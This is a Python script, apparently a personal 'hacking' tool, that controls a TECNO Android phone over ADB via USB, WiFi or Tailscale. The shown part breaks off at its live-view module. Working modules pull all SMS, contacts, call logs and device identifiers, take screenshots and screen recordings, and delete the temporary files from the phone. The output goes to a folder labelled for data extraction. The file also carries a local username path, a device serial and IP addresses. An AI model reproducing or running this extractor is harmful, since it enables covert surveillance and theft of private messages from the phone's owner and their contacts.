#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                                                                                  â•‘
â•‘     â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â•‘
â•‘     â–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â• â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—    â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘â•‘
â•‘     â–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â•‘
â•‘     â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•”â•â•â•â• â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â•‘
â•‘     â–ˆâ–ˆâ•‘ â•šâ•â• â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â•‘
â•‘     â•šâ•â•     â•šâ•â•â•šâ•â•â•â•â•â•â• â•šâ•â•â•â•â•â• â•šâ•â•  â•šâ•â•    â•šâ•â•     â•šâ•â•  â•šâ•â• â•šâ•â•â•â•â•â• â•šâ•â•  â•šâ•â•â•â•â•‘
â•‘                                                                                  â•‘
â•‘                    CONTRÃ”LEUR TÃ‰LÃ‰PHONE ULTRA-COMPLET                           â•‘
â•‘                         35+ FONCTIONNALITÃ‰S AVANCÃ‰ES                            â•‘
â•‘                                                                                  â•‘
â•‘     ğŸ“± Cible: TECNO CK6 (Camon 20) - Android 14                                 â•‘
â•‘     ğŸ”— Connexion: USB / WiFi / Tailscale                                        â•‘
â•‘                                                                                  â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
"""

import subprocess
import os
import sys
import json
import time
import threading
import shutil
from datetime import datetime
from pathlib import Path

# Pour notification longue
import textwrap

def envoyer_notification_longue(message, titre="Notification", device_id="101132534I100038"):
    """
    Envoie une notification longue (BigTextStyle) sur le tÃ©lÃ©phone via Termux (nÃ©cessite Termux + termux-api installÃ© sur le tÃ©lÃ©phone).
    """
    # Limite raisonnable pour une notification Android (BigTextStyle) : ~400 caractÃ¨res
    max_len = 400
    message = message.replace('"', '\"')
    titre = titre.replace('"', '\"')
    if len(message) <= max_len:
        cmd = f'am startservice --user 0 -n com.termux.api/.NotificationService --es title "{titre}" --es content "{message}"'
        adb_cmd = f'"C:\\Users\\davis\\AppData\\Local\\Microsoft\\WinGet\\Packages\\Google.PlatformTools_Microsoft.Winget.Source_8wekyb3d8bbwe\\platform-tools\\adb.exe" -s {device_id} shell {cmd}'
        print_info(f"[INFO] Envoi notification longue...\n{message}")
        os.system(adb_cmd)
    else:
        # DÃ©couper le message en plusieurs notifications
        chunks = [message[i:i+max_len] for i in range(0, len(message), max_len)]
        for idx, chunk in enumerate(chunks):
            titre_chunk = f"{titre} ({idx+1}/{len(chunks)})" if len(chunks) > 1 else titre
            cmd = f'am startservice --user 0 -n com.termux.api/.NotificationService --es title "{titre_chunk}" --es content "{chunk}"'
            adb_cmd = f'"C:\\Users\\davis\\AppData\\Local\\Microsoft\\WinGet\\Packages\\Google.PlatformTools_Microsoft.Winget.Source_8wekyb3d8bbwe\\platform-tools\\adb.exe" -s {device_id} shell {cmd}'
            print_info(f"[INFO] Envoi notification ({idx+1}/{len(chunks)})...\n{chunk}")
            os.system(adb_cmd)

# Exemple d'utilisation :
# envoyer_notification_longue("Ceci est un message trÃ¨s long qui doit s'afficher en entier dans la notification sur le tÃ©lÃ©phone Android. Testez avec un texte de plusieurs lignes pour vÃ©rifier l'affichage.")

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MENU : ENVOYER UNE NOTIFICATION PERSONNALISÃ‰E
def menu_envoyer_notification():
    print("\n--- ENVOYER UNE NOTIFICATION PERSONNALISÃ‰E ---")
    titre = input("Titre de la notification : ")
    message = input("Message Ã  afficher (long possible) : ")
    envoyer_notification_longue(message, titre)
    print_success("Notification envoyÃ©e !")

# Pour tester rapidement :
# menu_envoyer_notification()
# CONFIGURATION
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

ADB_PATH = r"C:\Users\davis\AppData\Local\Microsoft\WinGet\Packages\Google.PlatformTools_Microsoft.Winget.Source_8wekyb3d8bbwe\platform-tools\adb.exe"
SCRCPY_PATH = r"C:\Users\davis\AppData\Local\Microsoft\WinGet\Packages\Genymobile.scrcpy_Microsoft.Winget.Source_8wekyb3d8bbwe\scrcpy-win64-v3.3.3\scrcpy.exe"

# IPs possibles
TAILSCALE_IP = "100.88.242.60:5555"
LOCAL_IP = "192.168.1.2:5555"

# Dossier de sortie
OUTPUT_BASE = Path(r"C:\Users\davis\OneDrive\Bureau\HACKING\02_EXTRACTION_DONNEES\TECNO_CK6")

# Appareil actif
DEVICE = None

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# COULEURS CONSOLE
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class C:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_success(msg):
    print(f"    {C.GREEN}âœ… {msg}{C.END}")

def print_error(msg):
    print(f"    {C.RED}âŒ {msg}{C.END}")

def print_warning(msg):
    print(f"    {C.YELLOW}âš ï¸  {msg}{C.END}")

def print_info(msg):
    print(f"    {C.CYAN}â„¹ï¸  {msg}{C.END}")

def print_data(label, value):
    print(f"    {C.MAGENTA}{label}:{C.END} {value}")

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# FONCTIONS ADB DE BASE
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def adb(command, timeout=60):
    """ExÃ©cuter une commande ADB"""
    global DEVICE
    try:
        if DEVICE:
            full_cmd = f'"{ADB_PATH}" -s {DEVICE} {command}'
        else:
            full_cmd = f'"{ADB_PATH}" {command}'
        
        result = subprocess.run(
            full_cmd, 
            shell=True, 
            capture_output=True, 
            text=True, 
            timeout=timeout,
            encoding='utf-8',
            errors='replace'
        )
        return result.stdout.strip() + result.stderr.strip()
    except subprocess.TimeoutExpired:
        return "[TIMEOUT]"
    except Exception as e:
        return f"[ERREUR] {e}"

def adb_shell(command, timeout=60):
    """Raccourci pour adb shell"""
    return adb(f'shell {command}', timeout)

def adb_pull(remote, local):
    """TÃ©lÃ©charger un fichier"""
    return adb(f'pull "{remote}" "{local}"')

def adb_push(local, remote):
    """Envoyer un fichier"""
    return adb(f'push "{local}" "{remote}"')

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# CONNEXION ET DETECTION
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def find_devices():
    """Trouver tous les appareils connectÃ©s"""
    result = adb("devices -l")
    devices = []
    
    for line in result.split('\n'):
        # Chercher les lignes avec "device" (Ã©tat connectÃ©)
        if 'device' in line and 'List' not in line and 'attached' not in line:
            parts = line.split()
            if len(parts) >= 2 and parts[1] == 'device':
                device_id = parts[0]
                # Extraire le modÃ¨le
                model = "Inconnu"
                if 'model:' in line:
                    model = line.split('model:')[1].split()[0]
                devices.append((device_id, model))
    
    return devices

def connect_device():
    """Connecter au tÃ©lÃ©phone"""
    global DEVICE
    
    print(f"\n{C.CYAN}ğŸ” Recherche des appareils...{C.END}\n")
    
    # Essayer de se connecter via diffÃ©rentes mÃ©thodes
    connections = [
        ("USB", None),
        ("Tailscale", TAILSCALE_IP),
        ("WiFi Local", LOCAL_IP)
    ]
    
    for name, ip in connections:
        if ip:
            print(f"    Tentative {name} ({ip})...", end=" ")
            adb(f"connect {ip}")
            time.sleep(1)
        else:
            print(f"    VÃ©rification {name}...", end=" ")
        
        devices = find_devices()
        if devices:
            print(f"{C.GREEN}OK{C.END}")
            break
        print(f"{C.RED}Non trouvÃ©{C.END}")
    
    if not devices:
        print_error("Aucun appareil trouvÃ©!")
        print_info("VÃ©rifiez que le dÃ©bogage USB est activÃ©")
        return False
    
    # Si plusieurs appareils, choisir
    if len(devices) > 1:
        print(f"\n{C.YELLOW}Plusieurs appareils dÃ©tectÃ©s:{C.END}")
        for i, (dev_id, model) in enumerate(devices, 1):
            print(f"    [{i}] {dev_id} ({model})")
        
        choice = input("\nChoisir (1-{}): ".format(len(devices)))
        try:
            DEVICE = devices[int(choice)-1][0]
        except:
            DEVICE = devices[0][0]
    else:
        DEVICE = devices[0][0]
    
    # VÃ©rifier la connexion
    model = adb_shell("getprop ro.product.model")
    print(f"\n{C.GREEN}âœ… ConnectÃ© Ã : {model} ({DEVICE}){C.END}")
    
    return True

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# CRÃ‰ATION DES DOSSIERS
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def create_output_folders():
    """CrÃ©er les dossiers de sortie"""
    folders = [
        OUTPUT_BASE,
        OUTPUT_BASE / "SMS",
        OUTPUT_BASE / "Contacts",
        OUTPUT_BASE / "Appels",
        OUTPUT_BASE / "Photos",
        OUTPUT_BASE / "Videos",
        OUTPUT_BASE / "WhatsApp",
        OUTPUT_BASE / "Documents",
        OUTPUT_BASE / "Screenshots",
        OUTPUT_BASE / "Recordings",
        OUTPUT_BASE / "Apps",
        OUTPUT_BASE / "System",
        OUTPUT_BASE / "Notifications",
        OUTPUT_BASE / "WiFi",
        OUTPUT_BASE / "GPS",
    ]
    
    for folder in folders:
        folder.mkdir(parents=True, exist_ok=True)

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MODULE 1: INFORMATIONS SYSTÃˆME
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def get_system_info():
    """RÃ©cupÃ©rer toutes les informations systÃ¨me"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ“± INFORMATIONS SYSTÃˆME COMPLÃˆTES{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    info = {}
    
    # Hardware
    print(f"    {C.YELLOW}[MATÃ‰RIEL]{C.END}")
    info['modele'] = adb_shell("getprop ro.product.model")
    info['marque'] = adb_shell("getprop ro.product.brand")
    info['fabricant'] = adb_shell("getprop ro.product.manufacturer")
    info['device'] = adb_shell("getprop ro.product.device")
    info['hardware'] = adb_shell("getprop ro.hardware")
    
    print_data("ModÃ¨le", info['modele'])
    print_data("Marque", info['marque'])
    print_data("Fabricant", info['fabricant'])
    print_data("Processeur", info['hardware'])
    
    # SystÃ¨me
    print(f"\n    {C.YELLOW}[SYSTÃˆME]{C.END}")
    info['android'] = adb_shell("getprop ro.build.version.release")
    info['sdk'] = adb_shell("getprop ro.build.version.sdk")
    info['build'] = adb_shell("getprop ro.build.display.id")
    info['security_patch'] = adb_shell("getprop ro.build.version.security_patch")
    
    print_data("Android", info['android'])
    print_data("SDK", info['sdk'])
    print_data("Build", info['build'])
    print_data("Patch sÃ©curitÃ©", info['security_patch'])
    
    # Ã‰cran
    print(f"\n    {C.YELLOW}[Ã‰CRAN]{C.END}")
    screen = adb_shell("wm size")
    density = adb_shell("wm density")
    info['screen'] = screen.replace("Physical size: ", "")
    info['density'] = density.replace("Physical density: ", "")
    
    print_data("RÃ©solution", info['screen'])
    print_data("DensitÃ©", info['density'])
    
    # Identifiants
    print(f"\n    {C.YELLOW}[IDENTIFIANTS]{C.END}")
    info['serial'] = adb_shell("getprop ro.serialno")
    info['android_id'] = adb_shell("settings get secure android_id")
    
    print_data("NumÃ©ro de sÃ©rie", info['serial'])
    print_data("Android ID", info['android_id'])
    
    # RÃ©seau
    print(f"\n    {C.YELLOW}[RÃ‰SEAU]{C.END}")
    info['wifi_mac'] = adb_shell("cat /sys/class/net/wlan0/address 2>/dev/null")
    ip_output = adb_shell("ip addr show wlan0 2>/dev/null | grep 'inet '")
    info['ip'] = ip_output.split()[1] if 'inet' in ip_output else "N/A"
    
    print_data("MAC WiFi", info['wifi_mac'])
    print_data("IP", info['ip'])
    
    # Batterie
    print(f"\n    {C.YELLOW}[BATTERIE]{C.END}")
    battery = adb_shell("dumpsys battery")
    for line in battery.split('\n'):
        if 'level' in line.lower():
            info['battery_level'] = line.split(':')[-1].strip()
            print_data("Niveau", f"{info['battery_level']}%")
        elif 'status' in line.lower():
            status_code = line.split(':')[-1].strip()
            status_map = {'1': 'Inconnu', '2': 'En charge', '3': 'DÃ©charge', '4': 'Non charge', '5': 'Pleine'}
            info['battery_status'] = status_map.get(status_code, status_code)
            print_data("Ã‰tat", info['battery_status'])
    
    # Stockage
    print(f"\n    {C.YELLOW}[STOCKAGE]{C.END}")
    storage = adb_shell("df -h /sdcard | tail -1")
    parts = storage.split()
    if len(parts) >= 4:
        info['storage_total'] = parts[1]
        info['storage_used'] = parts[2]
        info['storage_free'] = parts[3]
        print_data("Total", info['storage_total'])
        print_data("UtilisÃ©", info['storage_used'])
        print_data("Libre", info['storage_free'])
    
    # Sauvegarder
    info['timestamp'] = datetime.now().isoformat()
    with open(OUTPUT_BASE / "System" / "system_info.json", "w", encoding="utf-8") as f:
        json.dump(info, f, indent=2, ensure_ascii=False)
    
    print_success(f"SauvegardÃ©: System/system_info.json")
    
    return info

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MODULE 2: EXTRACTION SMS
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def extract_sms():
    """Extraire tous les SMS"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ’¬ EXTRACTION DES SMS{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    # SMS reÃ§us
    print(f"    {C.YELLOW}[SMS REÃ‡US]{C.END}")
    inbox = adb_shell('content query --uri content://sms/inbox --projection "address,body,date,read" --sort "date DESC"')
    
    inbox_count = inbox.count("Row:")
    print_info(f"{inbox_count} SMS reÃ§us trouvÃ©s")
    
    # Afficher les 5 derniers
    rows = inbox.split("Row:")
    for row in rows[1:6]:
        if "address=" in row:
            addr = row.split("address=")[1].split(",")[0] if "address=" in row else "?"
            body = row.split("body=")[1].split(", date=")[0][:50] if "body=" in row else ""
            print(f"        ğŸ“© {addr}: {body}...")
    
    # SMS envoyÃ©s
    print(f"\n    {C.YELLOW}[SMS ENVOYÃ‰S]{C.END}")
    sent = adb_shell('content query --uri content://sms/sent --projection "address,body,date" --sort "date DESC"')
    
    sent_count = sent.count("Row:")
    print_info(f"{sent_count} SMS envoyÃ©s trouvÃ©s")
    
    # Sauvegarder
    with open(OUTPUT_BASE / "SMS" / "sms_inbox.txt", "w", encoding="utf-8") as f:
        f.write(f"=== SMS REÃ‡US - {datetime.now()} ===\n\n")
        f.write(inbox)
    
    with open(OUTPUT_BASE / "SMS" / "sms_sent.txt", "w", encoding="utf-8") as f:
        f.write(f"=== SMS ENVOYÃ‰S - {datetime.now()} ===\n\n")
        f.write(sent)
    
    print_success(f"SauvegardÃ©: SMS/sms_inbox.txt ({inbox_count} messages)")
    print_success(f"SauvegardÃ©: SMS/sms_sent.txt ({sent_count} messages)")
    
    return inbox_count + sent_count

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MODULE 3: EXTRACTION CONTACTS
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def extract_contacts():
    """Extraire tous les contacts"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ“‡ EXTRACTION DES CONTACTS{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    contacts = adb_shell('content query --uri content://contacts/phones --projection "display_name,number,photo_id"')
    
    count = contacts.count("Row:")
    print_info(f"{count} contacts trouvÃ©s")
    
    # Parser et afficher
    rows = contacts.split("Row:")
    contact_list = []
    
    for row in rows[1:]:
        if "display_name=" in row:
            name = row.split("display_name=")[1].split(",")[0] if "display_name=" in row else "?"
            number = row.split("number=")[1].split(",")[0] if "number=" in row else "?"
            contact_list.append({"name": name, "number": number})
            
            if len(contact_list) <= 10:
                print(f"        ğŸ‘¤ {name[:25]:<25} ğŸ“ {number}")
    
    if count > 10:
        print(f"\n        ... et {count - 10} autres contacts")
    
    # Sauvegarder en TXT et JSON
    with open(OUTPUT_BASE / "Contacts" / "contacts.txt", "w", encoding="utf-8") as f:
        f.write(f"=== CONTACTS - {datetime.now()} ===\n\n")
        f.write(contacts)
    
    with open(OUTPUT_BASE / "Contacts" / "contacts.json", "w", encoding="utf-8") as f:
        json.dump(contact_list, f, indent=2, ensure_ascii=False)
    
    print_success(f"SauvegardÃ©: Contacts/contacts.txt")
    print_success(f"SauvegardÃ©: Contacts/contacts.json")
    
    return count

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MODULE 4: HISTORIQUE APPELS
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def extract_call_history():
    """Extraire l'historique des appels"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ“ HISTORIQUE DES APPELS{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    calls = adb_shell('content query --uri content://call_log/calls --projection "number,name,type,date,duration" --sort "date DESC"')
    
    count = calls.count("Row:")
    print_info(f"{count} appels trouvÃ©s")
    
    print(f"\n    {C.YELLOW}LÃ©gende: ğŸ“¥ Entrant | ğŸ“¤ Sortant | âŒ ManquÃ©{C.END}\n")
    
    # Parser et afficher
    rows = calls.split("Row:")
    
    for row in rows[1:11]:
        if "number=" in row:
            number = row.split("number=")[1].split(",")[0] if "number=" in row else "?"
            name = row.split("name=")[1].split(",")[0] if "name=" in row else ""
            duration = row.split("duration=")[1].split(",")[0] if "duration=" in row else "0"
            call_type = row.split("type=")[1].split(",")[0] if "type=" in row else "0"
            
            icon = {"1": "ğŸ“¥", "2": "ğŸ“¤", "3": "âŒ"}.get(call_type, "ğŸ“")
            display = f"{name} ({number})" if name and name != "NULL" else number
            
            print(f"        {icon} {display[:35]:<35} â±ï¸ {duration}s")
    
    if count > 10:
        print(f"\n        ... et {count - 10} autres appels")
    
    # Sauvegarder
    with open(OUTPUT_BASE / "Appels" / "call_history.txt", "w", encoding="utf-8") as f:
        f.write(f"=== HISTORIQUE APPELS - {datetime.now()} ===\n")
        f.write("Type: 1=Entrant, 2=Sortant, 3=ManquÃ©\n\n")
        f.write(calls)
    
    print_success(f"SauvegardÃ©: Appels/call_history.txt")
    
    return count

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MODULE 5: CAPTURE D'Ã‰CRAN
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def take_screenshot():
    """Prendre une capture d'Ã©cran"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ“¸ CAPTURE D'Ã‰CRAN{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    remote_file = f"/sdcard/screenshot_{timestamp}.png"
    local_file = OUTPUT_BASE / "Screenshots" / f"screenshot_{timestamp}.png"
    print_info("Capture en cours...")
    adb_shell(f"screencap -p {remote_file}")
    adb_pull(remote_file, str(local_file))
    adb_shell(f"rm {remote_file}")
    if local_file.exists():
        size = local_file.stat().st_size / 1024
        print_success(f"Capture sauvegardÃ©e : {local_file.name} ({size:.1f} KB)")
        print_info(f"Chemin du fichier image : {local_file}")
        return str(local_file)
    else:
        print_error("Ã‰chec de la capture")
        return None

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MODULE 6: ENREGISTREMENT Ã‰CRAN
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def record_screen(duration=30):
    """Enregistrer l'Ã©cran"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ¥ ENREGISTREMENT Ã‰CRAN{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    if duration > 180:
        duration = 180
        print_warning("DurÃ©e limitÃ©e Ã  180 secondes")
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    remote_file = f"/sdcard/record_{timestamp}.mp4"
    local_file = OUTPUT_BASE / "Recordings" / f"record_{timestamp}.mp4"
    print_info(f"Enregistrement pendant {duration} secondes...")
    print_info("(L'Ã©cran du tÃ©lÃ©phone est enregistrÃ©)")
    adb_shell(f"screenrecord --time-limit {duration} {remote_file}", timeout=duration+10)
    adb_pull(remote_file, str(local_file))
    adb_shell(f"rm {remote_file}")
    if local_file.exists():
        size = local_file.stat().st_size / (1024*1024)
        print_success(f"VidÃ©o sauvegardÃ©e : {local_file.name} ({size:.1f} MB)")
        print_info(f"Chemin du fichier vidÃ©o : {local_file}")
        return str(local_file)
    else:
        print_error("Ã‰chec de l'enregistrement")
        return None

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MODULE 7: AFFICHAGE EN DIRECT (SCRCPY)
